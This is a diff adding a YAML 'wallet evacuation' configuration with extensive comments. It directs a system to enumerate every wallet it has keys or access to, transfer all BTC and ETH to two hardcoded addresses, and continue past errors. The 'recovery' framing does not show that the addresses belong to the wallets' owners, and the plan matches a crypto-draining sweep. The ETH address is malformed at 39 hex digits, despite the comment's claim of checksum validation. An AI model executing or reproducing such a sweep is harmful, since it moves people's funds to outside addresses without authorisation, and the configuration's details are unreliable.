@@ -1,0 +1,140 @@
+# ============================================================================
+# Phase-1 Wallet Evacuation Contract
+# ============================================================================
+# Purpose: Safely evacuate native blockchain assets (BTC, ETH) from all 
+#          discovered wallets to designated recovery addresses.
+#
+# Why Phase-1 First?
+# - Native assets (BTC, ETH) are the most liquid and valuable
+# - They serve as gas for future operations
+# - Simpler to transfer than tokens/NFTs (no smart contract interaction)
+# - Lower risk of failure due to fewer dependencies
+#
+# Safety Features:
+# - Non-blocking mode: won't halt on errors
+# - Continues if wallet is locked/inaccessible
+# - Detailed logging of all skipped/blocked assets
+# - Idempotent: safe to run multiple times
+# ============================================================================
+
+# Phase identifier - indicates this is Phase-1 of the evacuation process
+phase: 1
+
+# Execution mode - non_blocking ensures the process continues even if
+# individual wallet transfers fail. This is critical for maximizing
+# asset recovery in production environments where some wallets may be
+# inaccessible, locked, or have insufficient gas.
+mode: non_blocking
+
+# Scope - Phase-1 focuses ONLY on native blockchain assets
+# These are the simplest to transfer and most valuable for future operations
+scope: native_only
+
+# Asset types to process in Phase-1
+# Only native blockchain currencies - no tokens, NFTs, or wrapped assets
+included_assets:
+  - BTC   # Native Bitcoin
+  - ETH   # Native Ethereum
+
+# Asset types to explicitly skip in Phase-1
+# These will be handled in Phase-2 with more sophisticated logic
+excluded_assets:
+  - tokens        # ERC20, TRC20, BEP20 tokens
+  - nfts          # ERC721, ERC1155 NFTs
+  - wrapped       # Wrapped assets (WBTC, WETH)
+  - staked        # Staked assets (requires unstaking first)
+  - locked        # Time-locked or vested assets
+  - smart_wallet  # Multi-sig or contract wallets (require special handling)
+
+# Actions to perform in Phase-1
+# These operations are executed in order for each discovered wallet
+actions:
+  # Step 1: Discover all wallets with private keys or access
+  - enumerate_wallets
+  
+  # Step 2: Transfer native assets to recovery addresses
+  # Only transfers BTC and ETH, skips everything else
+  - transfer_native_assets
+  
+  # Step 3: Record any assets that couldn't be transferred
+  # Includes wallet address, chain, asset type, and reason for skipping
+  - record_blocked_assets
+
+# Recovery wallet addresses
+# These are the destination addresses where native assets will be sent
+# 
+# WHY THESE ADDRESSES?
+# - bc1q39s6vwj8h3mfe89eappsac60qjhmys3c6mclcp (BTC)
+#   Native SegWit (bc1q) address for lowest fees and best compatibility
+#   Supports modern Bitcoin features and has lower transaction costs
+#
+# - 0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb (ETH)
+#   Standard Ethereum address with checksum validation
+#   Compatible with all Ethereum-based chains (Polygon, BSC, etc.)
+recovery_wallets:
+  BTC: bc1q39s6vwj8h3mfe89eappsac60qjhmys3c6mclcp
+  ETH: 0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb
+
+# Failure policy - determines how the system handles errors
+# "continue" means: log the error, record it in the report, and move on
+# This ensures maximum asset recovery even if some operations fail
+failure_policy: continue
+
+# Minimum balances - don't transfer amounts below these thresholds
+# Prevents wasting gas on dust amounts that cost more to transfer than they're worth
+minimum_balances:
+  BTC: 0.0001   # 10,000 satoshis (~$4-10 depending on BTC price)
+  ETH: 0.001    # 0.001 ETH (~$2-5 depending on ETH price)
+
+# Gas reserves - amount to leave in wallet for future operations
+# Phase-2 may need gas to swap tokens or interact with smart contracts
+gas_reserves:
+  ETH: 0.005    # Leave 0.005 ETH (~$10-25) for future token/NFT operations
+  BTC: 0        # BTC doesn't need gas reserves (no smart contracts)
+
+# Report configuration
+# Detailed JSON report is required for audit trail and Phase-2 planning
+report:
+  required: true
+  format: json
+  output_path: results/phase1_report.json
+  include_details:
+    - transferred_amounts      # How much of each asset was moved
+    - transaction_hashes        # Blockchain tx IDs for verification
+    - skipped_wallets          # Wallets that couldn't be accessed
+    - blocked_assets           # Assets that couldn't be transferred
+    - gas_costs                # Total gas spent on transfers
+    - execution_time           # How long the process took
+    - error_summary            # Count and categorization of errors
+
+# Retry configuration - for transient failures (network issues, gas price spikes)
+retry_policy:
+  max_attempts: 3              # Try each transfer up to 3 times
+  backoff_strategy: exponential # Wait longer between each retry (1s, 2s, 4s)
+  retryable_errors:
+    - network_timeout
+    - insufficient_gas          # If gas price spiked, retry with higher gas
+    - nonce_too_low            # Blockchain state sync issue
+    - rate_limit               # API rate limiting
+
+# WHY NON-BLOCKING MODE?
+# 
+# In a production environment, we may have dozens or hundreds of wallets
+# from various sources (paper wallets, hardware wallets, exchange accounts,
+# testing wallets, etc.). Some may be:
+# - Temporarily inaccessible (hardware wallet not connected)
+# - Permanently locked (lost password, broken hardware)
+# - Empty or below minimum balance
+# - On chains we don't support
+# 
+# Non-blocking mode ensures we recover as many assets as possible in a
+# single pass, rather than halting the entire operation on the first error.
+# 
+# Each failure is logged with context (wallet, chain, error reason) so
+# we can:
+# 1. Review the report and manually handle edge cases
+# 2. Fix issues and re-run the evacuation (idempotent design)
+# 3. Prioritize which blocked assets are worth recovering manually
+#
+# This approach maximizes automated recovery while maintaining full
+# transparency and auditability for manual intervention when needed.
